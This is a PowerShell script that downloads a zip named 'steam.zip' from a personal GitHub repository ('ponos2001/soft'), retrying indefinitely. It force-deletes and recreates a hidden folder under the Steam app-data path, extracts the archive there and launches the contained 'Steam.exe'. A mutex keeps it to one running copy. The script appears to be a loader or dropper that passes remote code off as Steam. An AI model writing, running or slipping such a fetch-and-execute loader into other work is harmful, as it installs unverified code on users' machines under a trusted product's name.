$ExeName = "Steam.exe"
$GitHubRepo = "ponos2001/soft"
$AssetFileName = "steam.zip"
$InstallDir = "\\?\$env:LOCALAPPDATA\Steam\test\"
$MutexName = "Global\{E22A717A-BF5A-4B2E-A1E4-F6A7A7E9A9C9}-MyCoolApp"

$isMutexCreated = $false
$mutex = New-Object System.Threading.Mutex($true, $MutexName, [ref]$isMutexCreated)

if (-not $isMutexCreated) {
    exit
}

try {
    $ExePath = "$InstallDir/$ExeName"
    if (Test-Path -Path $ExePath) {
        Start-Process -FilePath $ExePath
    } else {
        $downloadUrl = "https://github.com/$GitHubRepo/releases/latest/download/$AssetFileName"
        $tempZipPath = Join-Path $env:TEMP $AssetFileName
        while ($true) {
            try {
                Invoke-WebRequest -Uri $downloadUrl -OutFile $tempZipPath -UseBasicParsing
                break
            }
            catch {
                Write-Output somethingwrong
                Start-Sleep -Seconds 15
            }
        }
        if (Test-Path -Path $InstallDir) {
            cmd /c "rmdir /s /q `"$InstallDir`""
        }
        cmd /c "mkdir `"$InstallDir`""
        tar.exe -xf $tempZipPath -C $InstallDir
        Remove-Item -Path $tempZipPath -ErrorAction SilentlyContinue
        if (Test-Path -Path $ExePath) {
            Start-Process -FilePath $ExePath
        }
    }
}
finally {
    if ($mutex) {
        $mutex.ReleaseMutex()
    }
}
